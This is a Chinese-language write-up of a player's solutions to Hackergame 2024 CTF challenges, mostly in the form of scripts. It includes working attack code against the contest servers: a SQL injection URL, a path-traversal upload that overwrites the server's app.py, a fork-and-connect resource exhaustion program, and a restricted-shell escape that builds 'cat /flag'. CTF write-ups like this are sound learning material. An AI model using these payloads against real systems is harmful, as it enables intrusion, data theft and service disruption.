# Writeup for Hackergame 2024

> Author: 夏和小(阿贝多), Rank 29(Score: 5800)
> 在西七区上分每次早上一起床就发现被猛超，就只能趁国内的盆友们睡觉的时候偷分了😋

## 签到
改 URL 为 `http://202.38.93.141:12024/?pass=true`

## 喜欢做签到的 CTFer 你们好呀
这不是我们 [NEBULA](https://www.nebuu.la) 的主页吗，下次拿出来要标明出处【唐氏表情.jpg】
```shell
$ ENV
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!

# $ ls -la
$ cat .flag
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

## 猫咪问答（Hackergame 十周年纪念版）
1.  在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？
    - 翻 LUG 网站 -> 3A204
2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？
    - 翻 Github 和 LUG 网站 -> 2682
3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？
    - 翻 2018 年猫咪问答 -> 程序员的自我修养
4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？
    - 看不进去，扔个 GPT -> 336
5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？
    - 谷歌 -> 6e90b6
6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？
    - 特地跑过去申请了一个 Llama3 的 token，跑出来 1834... 应该是哪里出问题了，从 1830 开始试 -> 1833
    *PS:后来在QQ群里看到有人发了原因，是tokenizer会在结束的地方加一个EOS导致的1834*

*flag{α_90oD_C@7_!$_7hE_©a7_WHO_©@n_Pas5_THe_Qui2}*
*flag{t3n_¥eArs_Oƒ_hαCK3rG@me_OMed37Oบ_wiTh_И3K0_Qu!Z}*

## 每日论文太多了！
直接搜 flag 发现了 `flag here` 但是没看到别的东西了，索性找个分离图片的工具试试
```shell
pdfimages -all flag_paper.pdf output
```
发现一张图片里面有 flag

## 比大小王
```python
import requests
import json
import time

URL = "http://202.38.93.141:12122"
game_route = "/game"
submit_route = "/submit"
token = ""
session = requests.Session()
session.get(URL+"/?token="+token)
session.get(URL)
session.headers['Content-Type'] = "application/json"
game_questions_text = session.post(URL + game_route, json={}).text
game_questions = json.loads(game_questions_text)["values"]

ans = []
for question in game_questions:
    if question[0] > question[1]:
        ans.append('>')
    elif question[0] < question[1]:
        ans.append('<')
    else:
        print("Error")

session.headers['Content-Type'] = "application/json"
time.sleep(10) # 防止经典时空穿越
print(session.post(URL + submit_route, json={"inputs":  ans}).json())
```

## PowerfulShell
```shell
PowerfulShell@hackergame> _1=~ # /players
PowerfulShell@hackergame> _2=${_1:2:1}${_1:7:1} # ls
PowerfulShell@hackergame> _3=${_1::1} # / 
PowerfulShell@hackergame> _8=`$_2 $_3` # result of `ls /`
PowerfulShell@hackergame> _7=${_8:17:4} # flag
PowerfulShell@hackergame> _6=${_8:15:1}${_8:19:1}${_8:7:1} # cat
PowerfulShell@hackergame> $_6 $_3$_7 # cat /flag
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_da95bf98fc}
```
拼就完了，但是我开始是不知道 `$_2 $_3` 会返回 eval 后的结果的，运气好试出来的 ：））））

## PaoluGPT
简单的 SQL 注入
```python
import requests
import tqdm
from urllib.parse import quote

token = ""
encoded_token = quote(token)

START_URL = "https://chal01-manager.hack-challenge.lug.ustc.edu.cn:8443/docker-manager/start?" + encoded_token
LIST_URL = "https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/list"

session = requests.Session()
init = session.get(START_URL)
chat_list = session.get(LIST_URL).text
chat_lists = chat_list.split("\n<li>")[1:]

# Challenge 1
for lines in tqdm.tqdm(chat_lists):
    if "/view?conversation_id=" in lines:
        conversation_id = lines.split("/view?conversation_id=")[1][:len('48e475ff-9234-4da6-97b2-6dfec81e757e')]
        view_url = f"https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id={conversation_id}"
        view = session.get(view_url).text.replace("\n", "")
        if "flag" in view:
            print(conversation_id)
            print(view)
            break
# flag{zU1_xiA0_de_11m_Pa0lule!!!_73a5cee3f9}

# Challenge 2
view_url = f"https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=-1'or shown=false--'"
view = session.get(view_url).text.replace("\n", "")
print(view)
# flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_657f7eaad1}
```

## 强大的正则表达式
学过的编译原理最有用的一集（虽然最后还是用的传奇轮子 `greenery`,简直是我爹
这里只给最后一问的 exp，因为三个都是一样的，只需要改一下 `alphabet` 和 `state` 以及 `map` 就可以
最后一问主要就是要注意到 `CRC GSM8` 也是有固定的状态转换的，所以就和前两纹眉有任何区别，手动写一份/写脚本生成一个 `map` 就可以。
```python
from greenery.fsm import fsm
import re
import libscrc

alphabet = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'}
states = {0, 1, 2, 3, 4, 5, 6, 7}
initial = 7
finals = {0}

map = {
 0: {'0': 1,'1': 2,'2': 7,'3': 4,'4': 6,'5': 5,'6': 0,'7': 3,'8': 4,'9': 7},
 1: {'0': 3,'1': 0,'2': 5,'3': 6,'4': 4,'5': 7,'6': 2,'7': 1,'8': 6,'9': 5},
 2: {'0': 5,'1': 6,'2': 3,'3': 0,'4': 2,'5': 1,'6': 4,'7': 7,'8': 0,'9': 3},
 3: {'0': 7,'1': 4,'2': 1,'3': 2,'4': 0,'5': 3,'6': 6,'7': 5,'8': 2,'9': 1},
 4: {'0': 2,'1': 1,'2': 4,'3': 7,'4': 5,'5': 6,'6': 3,'7': 0,'8': 7,'9': 4},
 5: {'0': 0,'1': 3,'2': 6,'3': 5,'4': 7,'5': 4,'6': 1,'7': 2,'8': 5,'9': 6},
 6: {'0': 6,'1': 5,'2': 0,'3': 3,'4': 1,'5': 2,'6': 7,'7': 4,'8': 3,'9': 0},
 7: {'0': 4,'1': 7,'2': 2,'3': 1,'4': 3,'5': 0,'6': 5,'7': 6,'8': 1,'9': 2}
}

divisible_by_3_fsm = fsm(alphabet, states, initial, finals, map)
regex = divisible_by_3_fsm.lego()
final = str(regex).replace(')?', '|)').replace('[29]', '(2|9)').replace('[38]', '(3|8)')

print(len(final))

from pwn import *

host = '202.38.93.141'
port = 30303
token = b""
conn = remote(host, port)

conn.recv()
conn.sendline(token)
conn.recv()
conn.sendline(b'3')
conn.recv()
conn.sendline(final.encode())
conn.interactive()
```

## 惜字如金 3.0
因为服务器会返回计算的哈希，所以其实可以随便找一行输入一个 `\x7f` 即 `0b01111111` 来直接得到 `flip` 的值（这里要简单逆一下 `CRC` 的计算，主要是要注意到 `\x7f` 输入进去后得到的结果是 `flip` 没有经过任何移位异或的结果
```python
# EXP 1: Recover Python code mannually
# flag1: flag{C0mpl3ted-Th3-Pyth0n-C0de-N0w}

# EXP 2:
ref_hash = '596b56a3bed7' # row content: b'\x7f', little endian

# change ref_hash to big endian
ref_hash_bytes = bytes.fromhex(ref_hash)
ref_hash_bytes = ref_hash_bytes[::-1]
ref_hash = ref_hash_bytes.hex()

def calc_hash(digest):
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)
    return hex(digest)

for i in range(16):
    if calc_hash(i)[-1] == ref_hash[-1]:
        print(hex(i)) # 0x1 or 0xc

former = 0xc
for idx in range(1,len(ref_hash)):
    for i in range(16):
        if calc_hash((i << (4*idx))+former)[-idx-1] == ref_hash[-idx-1]:
            former += i << (4*idx)
            break
print(hex(former)) # 0x5e2a653c94bc

former = 0x1
for idx in range(1,len(ref_hash)):
    for i in range(16):
        if calc_hash((i << (4*idx))+former)[-idx-1] == ref_hash[-idx-1]:
            former += i << (4*idx)
            break
print(hex(former)) # 0x23cdc6e82991

ref_hash = '596b56a3bed7' # row content: b'\xff', little endian

possible_flip_1 = (0x5e2a653c94bc ^ (1<<48)-1) ^ 0xffffffffff # 0xa12a653c94bc
possible_flip_2 = (0x23cdc6e82991 ^ (1<<48)-1) ^ 0xffffffffff # 0xdccdc6e82991

print(calc_hash((possible_flip_1 ^ 0xffffffffff)^(1<<48)-1) == ref_hash) # False
print(calc_hash((possible_flip_2 ^ 0xffffffffff)^(1<<48)-1) == ref_hash) # True

flip = possible_flip_2

def reverse_poly(flip_value, degree):
    result = [''] * degree
    for i in range(degree):
        if (flip_value >> i) & 1:
            result[i] = 'B'
        else:
            result[i] = 'b'
    return ''.join(result)

poly = 'B' + reverse_poly(flip, 48)
# BBbbbBbbBBbbBbBbbbbbBbBBBbBBbbbBBBbBBbbBBbbBBBbBB

# flag2: flag{Succe55fu11y-Deduced-A-CRC-Po1ynomia1}
```

## 优雅的不等式
刷知乎最有用的一集，帖子在[这里](https://zhuanlan.zhihu.com/p/450355422?utm_psn=1838583662888742912)公式如下
$$
S_n = \int_0^1 \frac{(x-x^2)^{4n}(a+b\dot x^2)}{(1+x^2)} dx \\
\frac{S_n}{4^{n-1}(a-b)} = \frac{T_n}{4^{n-1}(a-b)} - (-1)^{n-1}\pi \\
T_n = \int_0^1 \frac{(x-x^2)^{4n}(a+bx^2)-(-4)^n(a-b)}{(1+x^2)}dx
$$
然后就是搓代码
```python
import sympy as sp
from sympy import Symbol, Function, Eq, solve, Matrix, diff, Derivative, integrate, simplify, Rational
from pwn import *

def construct_function(a, b, n):
    num = "((x-x**2)**(4*"+str(n)+")*("+str(a)+"+"+str(b)+"*x**2))"
    den = "(1+x**2)"
    F = num + "/" + den
    return F

def solution(n, value):
    a = Symbol('a')
    b = Symbol('b')
    x = Symbol('x')

    F_T = ((x-x**2)**(4*n)*(a+b*x**2)-(-4)**n*(a-b))/(1+x**2)
    T = integrate(F_T, (x,0,1))
    T_str = str(T)

    a_loc = T_str.find('a')
    b_loc = T_str.find('b')
    blank_loc = T_str.find(' ')

    num_a = int(T_str[:a_loc-1])
    den_a = int(T_str[a_loc+2:blank_loc])
    num_b = int(T_str[blank_loc+1:b_loc-1].replace(' ', ''))
    den_b = int(T_str[b_loc+2:])

    coef_a = Rational(num_a,den_a)
    coef_b = Rational(num_b,den_b)

    eq_1 = Eq(Rational(-(-4)**(n-1))*(a-b), Rational(1))
    eq_2 = Eq(Rational(coef_a) * a + Rational(coef_b) * b, value)
    solution = solve((eq_1, eq_2), (a, b))

    a_val = solution[a]
    b_val = solution[b]

    assert Rational(-(-4)**(n-1))*(a_val-b_val) == 1, 'a and b must satisfy the first equation'
    assert Rational(coef_a) * a_val + Rational(coef_b) * b_val == value, 'a and b must satisfy the second equation'

    assert a_val > 0, 'a must be positive'
    assert b_val > 0, 'b must be positive'

    F = construct_function(a_val, b_val, n)
    _F = sp.parsing.sympy_parser.parse_expr(F)
    assert sp.simplify(sp.integrate(_F, (x, 0, 1)) - (sp.pi + value)) == 0, \
        'The function must satisfy the integral equation: ' + str(sp.integrate(_F, (x, 0, 1)))

    print(F)
    return F

host = '202.38.93.141'
port = 14514
token = b""

conn = remote(host, port)
conn.recvuntil(b"token:")
conn.sendline(token)
n = 1
for round in range(40):
    print(f"Round: {round}")
    conn.recvuntil(b"pi>=")
    pi_value_str = conn.recvuntil(b"\n").strip().decode()
    if '/' not in pi_value_str:
        conn.recv()
        conn.sendline(b'4*((1-x**2)**(1/2)-(1-x))')
        continue
    num, den = map(int, pi_value_str.split('/'))
    value = Rational(-num, den)
    while True:
        try:
            F = solution(n, value)
            conn.recv()
            conn.sendline(F.encode())
            break
        except:
            n += 1
    if round == 39:
        conn.interactive()
```

## 不太分布式的软总线
我是 prompt engineering 大师，GPT-o1 爆了这道题
### What DBus Gonna Do?
```shell
#!/bin/bash

dbus-send --print-reply --system \
	--dest=cn.edu.ustc.lug.hack.FlagService \
	/cn/edu/ustc/lug/hack/FlagService \
	cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
	string:"Please give me flag1"
```
### If I Could Be A File Descriptor
```C
#include <gio/gio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag2"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;

    // 连接到 DBus 系统总线
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    // 创建内存中的管道，直接写入请求内容 "Please give me flag2\n"
    int pipe_fds[2];
    if (pipe(pipe_fds) == -1) {
        perror("Failed to create pipe");
        return EXIT_FAILURE;
    }
    
    const char *request = "Please give me flag2\n";
    ssize_t written = write(pipe_fds[1], request, 21);  // 确保写入 21 个字节，包括换行符
    close(pipe_fds[1]); // 关闭写端，只保留读端

    if (written != 21) {
        fprintf(stderr, "Failed to write the full message to the pipe\n");
        close(pipe_fds[0]);
        return EXIT_FAILURE;
    }

    // 使用 DBus 调用 GetFlag2 方法，传递文件描述符
    GUnixFDList *fd_list = g_unix_fd_list_new_from_array(&pipe_fds[0], 1);
    result = g_dbus_connection_call_with_unix_fd_list_sync(
        connection,
        DEST,
        OBJECT_PATH,
        INTERFACE,
        METHOD,
        g_variant_new("(h)", 0),
        NULL,
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        fd_list,
        NULL,
        NULL,
        &error
    );

    if (result) {
        gchar *flag;
        g_variant_get(result, "(s)", &flag);
        g_print("Flag 2: %s\n", flag);
        g_free(flag);
        g_variant_unref(result);
    } else {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
        g_error_free(error);
    }

    g_object_unref(fd_list);
    close(pipe_fds[0]);
    g_object_unref(connection);
    return 0;
}
```
### Comm Say Maybe
```C
#define _GNU_SOURCE
#include <gio/gio.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
    // 使用 exec 调整进程名为 "getflag3"
    if (prctl(PR_SET_NAME, "getflag3", 0, 0, 0) != 0) {
        perror("Failed to set process name");
        return EXIT_FAILURE;
    }

    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;

    // 连接到 DBus 系统总线
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    // 调用 GetFlag3 方法
    result = g_dbus_connection_call_sync(
        connection,
        DEST,
        OBJECT_PATH,
        INTERFACE,
        METHOD,
        NULL,  // 无参数
        G_VARIANT_TYPE("(s)"),  // 期望返回类型为字符串
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        &error
    );

    // 检查返回结果
    if (result) {
        gchar *flag;
        g_variant_get(result, "(s)", &flag);
        g_print("Flag 3: %s\n", flag);
        g_free(flag);
        g_variant_unref(result);
    } else {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
        g_error_free(error);
    }

    g_object_unref(connection);
    return 0;
}
```

## 动画分享
不明不白的就出了第一个 `flag`，就简单尝试了下疯狂 fork
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define TARGET_PORT 8000
#define MAX_PROCESSES 100 

int main() {
    while(1) {
        pid_t pid = fork();

        if (pid < 0) {
            // fork 失败说明到 PID 上限了，保持主进程执行
            sleep(100);
        }

        if (pid == 0) {
            // 子进程
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            struct sockaddr_in server_addr;
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(TARGET_PORT);
            inet_aton("127.0.0.1", &server_addr.sin_addr);

            connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

            sleep(100);
        }
    }

    return 0;
}
```

## 关灯
经典 `z3`, 前三个的 exp 都一样
```python
from z3 import *
import numpy
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

def convert_switch_array_to_lights_array(switch_array: numpy.array) -> numpy.array:
    lights_array = numpy.zeros_like(switch_array)
    lights_array ^= switch_array
    lights_array[:-1, :, :] ^= switch_array[1:, :, :]
    lights_array[1:, :, :] ^= switch_array[:-1, :, :]
    lights_array[:, :-1, :] ^= switch_array[:, 1:, :]
    lights_array[:, 1:, :] ^= switch_array[:, :-1, :]
    lights_array[:, :, :-1] ^= switch_array[:, :, 1:]
    lights_array[:, :, 1:] ^= switch_array[:, :, :-1]
    return lights_array

def generate_puzzle(n: int) -> numpy.array:
    random_bytes = get_random_bytes((n**3) // 8 + 1)
    switch_array = numpy.unpackbits(numpy.frombuffer(random_bytes, dtype=numpy.uint8))[:(n**3)].reshape(n, n, n)
    lights_array = convert_switch_array_to_lights_array(switch_array)
    return lights_array

def solve_lights_out_3d(n, target_lights):
    switches = [[[Bool(f'switch_{x}_{y}_{z}') for z in range(n)] for y in range(n)] for x in range(n)]
    
    solver = Solver()
    
    def lights_out(x, y, z):
        toggle_list = [switches[x][y][z]]
        if x > 0:
            toggle_list.append(switches[x-1][y][z])
        if x < n-1:
            toggle_list.append(switches[x+1][y][z])
        if y > 0:
            toggle_list.append(switches[x][y-1][z])
        if y < n-1:
            toggle_list.append(switches[x][y+1][z])
        if z > 0:
            toggle_list.append(switches[x][y][z-1])
        if z < n-1:
            toggle_list.append(switches[x][y][z+1])
        return Sum([If(s, 1, 0) for s in toggle_list]) % 2 == int(target_lights[x][y][z])
    
    for x in range(n):
        for y in range(n):
            for z in range(n):
                solver.add(lights_out(x, y, z))
    
    if solver.check() == sat:
        model = solver.model()
        solution = [[[model.evaluate(switches[x][y][z]) for z in range(n)] for y in range(n)] for x in range(n)]
        solution_string = "".join(["1" if solution[x][y][z] else "0" for x in range(n) for y in range(n) for z in range(n)])
        return solution_string
    else:
        return "No solution found"

n = 11
lights_array = generate_puzzle(n)
solution = solve_lights_out_3d(n, lights_array)

print("Solution:", solution)
```

## 禁止内卷
我做的比较暴力，开始是尝试 inference 出来（没注意到加了 sanity），失败了 ~~听说有人可以 inference 出来，挺厉害的~~
因为题目里写了 `flask run --reload --host 0`，所以开始是尝试结合路径穿越漏洞上传一个新的 `secrets.py` 到运行目录下替换函数的，后来发现好像 `reload` 是不可以 `reload` 已经 import 的内容的遂失败（也可能是单纯的我搞错了），后面就直接路径穿越暴力覆盖 `app.py`，成功了

```python
import requests

host = "https://chal02-m8u2l3ak.hack-challenge.lug.ustc.edu.cn:8443"
url = host + "/submit"
session = requests.Session()

boundary = "-----------------------------330935380121946806301231286775"
headers = {
    "User-Agent": "Custom User Agent String",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Origin": host,
    "Referer": host + "/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
}

cookies = {
    "_ga": "GA1.3.1136939081.1704010130",
    "_ga_VR0TZSDVGE": "GS1.3.1708930541.2.1.1708930610.0.0.0",
    "sduuid": "11d79c7db986c2237ea0e97aa1b8b201"
}

json_content = '''
from flask import Flask, render_template, request, flash, redirect
import json
import os
import traceback
import secrets
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)
UPLOAD_DIR = "/tmp/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)
# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)
def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        for idx, i in enumerate(answers):
            exit(0)
    return answers
@app.route("/", methods=["GET"])
def index():
    res = render_template("index.html", results=sorted(results))
    ans = open('answers.json', 'r').read()
    flash(ans)
    return res
@app.route("/submit", methods=["POST"])
def submit():
    flash("Hacked")
    ans = open('answers.json', 'r').read()
    flash("Hacked:" + ans)
    return redirect("/")
    
'''.replace("\n", "\r\n")

body = (
    f"--{boundary}\r\n"
    f"Content-Disposition: form-data; name=\"file\"; filename=\"/../../../../../../tmp/web/app.py\"\r\n"
    f"Content-Type: application/json\r\n\r\n"
    f"{json_content}\r\n"
    f"--{boundary}--\r\n"
)

content_length = str(len(body.encode('utf-8')))
headers["Content-Length"] = content_length

response = session.post(url, headers=headers, cookies=cookies, data=body)

print(response.status_code)
print(response.text)
```

## 神秘代码 2
只做出来了第一个，打开后发现后面有一串看上去像 base64 字母表的东西，尝试了下换表 base64 就出了

## AI（名字太长了不抄了）
这下是老本行了（bushi，改了下 `llama_cpp/llama.py`，感觉没必要像官方解答那样 general，数理基础有些过于强大了（bushi，我选择直接手摇，其实用改过的 code 去手摇也就十分钟不到的事，直接调用 `generate` 这个 API 就可以，它已经做好了 KV Cache 之类的工作，还挺省时间的，最终在 H100 上一两分钟生成答案。
主要思路就是扔掉概率 $$P < 0.05$$ 的 token(唯一的例外是那个 `dazzling` 手动 patch 掉就可以) ，剩下的就是手摇 ：）））））
```python
class Llama():
    def __init__():
        ...
        self._generated_prompt = '''#'''
        self._former_choices = [1,2,1,1,1,1,1,2,2,1,1,2,1,1,1,1,3,1,2,1,1,1] # 用来手摇的
        self.pattern_string_1 = '第一题的 after.txt'
        self.pattern_string_2 = '第二题的 after.txt'
    
    def regex_match(self, text: str) -> bool:
        # print(text)
        pattern_string = self.pattern_string_2
        pattern = '^'
        allowed_chars = "hackergame of ustcx"
        # allowed_chars = "hackergamex"
        for c in pattern_string[:len(text)]:
            if c == 'x':
                pattern += f"[{allowed_chars}]"
            else:
                pattern += c
        pattern += '$'
        # print(pattern, text)
        regex = re.compile(pattern.replace('(', r'\(').replace(')', r'\)').replace('.', r'\.'))
        return regex.match(text) is not None   
    
    ... 

    def generate(...):
        ...
        while True:
            self.eval(tokens)
            while sample_idx < self.n_tokens:
                logits = self._scores[self.n_tokens - 1]
                probs = np.exp(logits) / np.sum(np.exp(logits))
                top_indices = np.argsort(probs)[-top_k:][::-1]
                top_tokens = [self.detokenize([i]) for i in top_indices]
                top_probs = probs[top_indices]
                
                choices = []
                for i, (token, prob) in enumerate(zip(top_tokens, top_probs)):
                    try:
                        decoded_token = token.decode(errors='ignore')
                        if not self.regex_match(self._generated_prompt + decoded_token):
                            pass
                        elif prob >= 0.05 or decoded_token.endswith('zzling'):
                            choices.append((i, decoded_token, prob))
                    except Exception as e:
                        print("Error decoding token: {}".format(e))
                        print(f"{i + 1}: Token = {token}, Probability = {prob:.4f}")
                        raise e
                print("Choices: ", choices)

                if len(choices) == 0:
                    next_token = self.detokenize([top_indices[0]]).decode()
                    print(next_token)
                    exit(0)
                else:
                    for i, decoded_token, prob in choices:
                        print_token = ''
                        for c in decoded_token:
                            if c not in 'hackergame of ustc':
                                print_token += '\033[94m' + c + '\033[0m'
                            else:
                                print_token += c
                        print(f"{i + 1}: Token = {print_token}, Probability = {prob:.4f}")
                    if len(choices) == 1:
                        choice = choices[0][0]
                    else:
                        if choices[0][2] > 0.5 or choices[0][2] >= 2*choices[1][2]:
                            choice = choices[0][0]
                        else:
                            if len(self._former_choices) > 0:
                                choice = self._former_choices.pop(0) - 1
                            else:
                                choice = int(input("Enter the number of the token you want to choose: ")) - 1

                token = top_indices[choice]
                prompt_token = top_tokens[choice]
                self._generated_prompt += prompt_token.decode()
                print(self._generated_prompt)
                print("***"*10)
                ...   
        ...
```

然后跑
```python
import hashlib
import random

from llama_cpp import Llama

import os
os.environ["CUDA_VISIBLE_DEVICES"] = "7"

# 1. Assert sha256 of the model file
model_path = "/root/qwen2.5-3b-instruct-q8_0.gguf"
expected_hash = "6dcc22694c8654b045ec40bbe350212b88893fd9010e8474bae5b19a43578ba1"

sha256_hash = hashlib.sha256()
with open(model_path, "rb") as f:
    for byte_block in iter(lambda: f.read(4096), b""):
        sha256_hash.update(byte_block)
calculated_hash = sha256_hash.hexdigest()

assert calculated_hash == expected_hash, "Model hash mismatch!"

# 2. Run the LLM with the given code
from llama_cpp import Llama

llm = Llama(
    model_path="/root/qwen2.5-3b-instruct-q8_0.gguf",
    n_ctx=1024,
    seed=random.SystemRandom().randint(0, 2**64),
    logits_all = True,
)

# prompt = [
#     {"role": "system", "content": "You are a professional CTF player."},
#     {
#         "role": "user",
#         "content": "Write a short article for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 500 words.",
#     }
# ]

prompt_1 = '''System: You are a professional CTF player.
User: Write a few sentences for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 100 words.
Assistant: In'''

prompt_2 = '''System: You are a professional CTF player.
User: Write a short article for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 500 words.
Assistant: #'''

prompt = prompt_2
response = llm.create_completion(prompt=prompt, max_tokens=700, top_k=10)
messages = prompt
# response = llm.create_chat_completion(messages=messages, max_tokens=500, top_k=20)
print(response)
```

PS: 这个题有一点非常坑，卡了我半天，就是它的 `showcase` 和 `show off` 长度相同而且推理出来的概率是均等的，只能靠手试，一共出现了三次，所以有 $$2^3=8$$ 种情况，还好它给了哈希，不至于到最后我也做不出来...